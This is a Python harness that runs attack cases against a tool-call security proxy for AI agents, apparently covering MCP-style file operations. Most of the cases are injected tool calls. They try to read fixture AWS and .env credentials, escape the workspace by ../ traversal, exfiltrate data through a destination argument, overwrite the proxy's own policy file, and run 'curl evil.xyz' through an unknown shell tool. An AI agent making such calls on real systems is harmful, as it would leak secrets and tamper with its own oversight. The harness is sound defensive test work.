"""Drives the Aegis proxy over real stdio with attack cases from THREAT-MODEL.md.

Not a unit test. Launches the actual proxy as a subprocess, speaks real
JSON-RPC to it, and prints the raw frames that come back.

SAFETY: this harness never reads or writes your real ~/.aws, ~/.ssh, or any
path outside ~/code/aegis-testlab. The "credentials" it tries to steal are
fixtures it creates itself. It refuses to run if the policy points anywhere
near your home directory root.
"""

import json
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
LAB = Path.home() / "code" / "aegis-testlab"
WS = LAB / "workspace"
FAKE_SECRETS = LAB / "fake-secrets" / ".aws" / "credentials"

POLICY = Path(
    os.environ.get(
        "AEGIS_POLICY", Path.home() / "Library" / "Application Support" / "Aegis" / "policy.json"
    )
).expanduser()


def bootstrap() -> None:
    """Create fixtures. Only ever writes inside ~/code/aegis-testlab."""
    if not POLICY.exists():
        sys.exit(f"policy not found at {POLICY} — see step 3 of the setup")

    doc = json.loads(POLICY.read_text())
    roots = [Path(r).expanduser().resolve() for r in doc.get("workspace_roots", [])]
    if not roots:
        sys.exit("policy has no workspace_roots")

    # Refuse to run against a dangerously broad policy.
    for r in roots:
        if r in (Path.home(), Path("/")) or Path.home() == r:
            sys.exit(f"refusing to run: workspace_root {r} is your home directory")

    if WS.resolve() not in roots:
        sys.exit(
            f"policy workspace_roots={[str(r) for r in roots]} does not include {WS}.\n"
            f"Set workspace_roots to [\"~/code/aegis-testlab/workspace\"] for this harness."
        )

    WS.mkdir(parents=True, exist_ok=True)
    FAKE_SECRETS.parent.mkdir(parents=True, exist_ok=True)
    (WS / "config.txt").write_text("conveyor_speed = 40\n")
    (WS / ".env").write_text("ANTHROPIC_API_KEY=sk-fake-fixture-not-real\n")
    FAKE_SECRETS.write_text("aws_secret_access_key = AKIAFAKEFIXTURE123\n")
    print(f"fixtures ready under {LAB}\npolicy: {POLICY}\n")


bootstrap()

CASES = [
    ("T1  legitimate read inside workspace",
     "read_file", {"path": str(WS / "config.txt")}),

    ("T1  legitimate write inside workspace",
     "write_file", {"path": str(WS / "notes.txt"), "content": "hello"}),

    ("T2  injected: read fixture AWS credentials (absolute)",
     "read_file", {"path": str(FAKE_SECRETS)}),

    ("T2  injected: escape workspace via ../ traversal",
     "read_file", {"path": str(WS / ".." / "fake-secrets" / ".aws" / "credentials")}),

    ("T2  injected: read .env inside the allowed workspace",
     "read_file", {"path": str(WS / ".env")}),

    ("T2  injected: exfil via second path arg (destination)",
     "write_file", {"path": str(WS / "ok.txt"),
                    "destination": "/tmp/aegis-exfil.txt", "content": "x"}),

    ("T1  destructive tool denied outright",
     "delete_file", {"path": str(WS / "config.txt")}),

    ("T5  ASK collapses to deny (no S5 approval loop yet)",
     "move_file", {"source": str(WS / "config.txt"), "destination": str(WS / "moved.txt")}),

    ("T3  unknown tool from a poisoned server",
     "exec_shell", {"command": "curl evil.xyz"}),

    ("T2  attempt to overwrite the Aegis policy file itself",
     "write_file", {"path": str(POLICY), "content": "{}"}),

    ("MAL malformed arguments (fail-closed path)",
     "read_file", "not-an-object"),
]

proc = subprocess.Popen(
    [sys.executable, str(ROOT / "aegis" / "proxy.py"), "--",
     sys.executable, str(ROOT / "tests" / "mock_fs_server.py")],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True, bufsize=1,
)


def call(i, tool, args):
    proc.stdin.write(json.dumps({
        "jsonrpc": "2.0", "id": i, "method": "tools/call",
        "params": {"name": tool, "arguments": args},
    }) + "\n")
    proc.stdin.flush()
    line = proc.stdout.readline()
    if not line:
        sys.exit("proxy exited early — check stderr above (likely a policy load refusal)")
    return json.loads(line)


allowed = denied = 0
print("=" * 78)
for i, (label, tool, args) in enumerate(CASES, start=1):
    reply = call(i, tool, args)
    result = reply.get("result", {})
    text = result.get("content", [{}])[0].get("text", "")
    is_denied = bool(result.get("isError"))
    denied += is_denied
    allowed += not is_denied
    print(f"\n[{'DENIED ' if is_denied else 'ALLOWED'}] {label}")
    print(f"  tool={tool} args={args}")
    for ln in text.splitlines():
        print(f"  | {ln}")

print("\n" + "=" * 78)
print(f"RESULT: {allowed} allowed, {denied} denied  (expected: 2 allowed, 9 denied)")
print(f"exfil file created? {Path('/tmp/aegis-exfil.txt').exists()}  (expected: False)")

proc.stdin.close()
proc.wait(timeout=5)
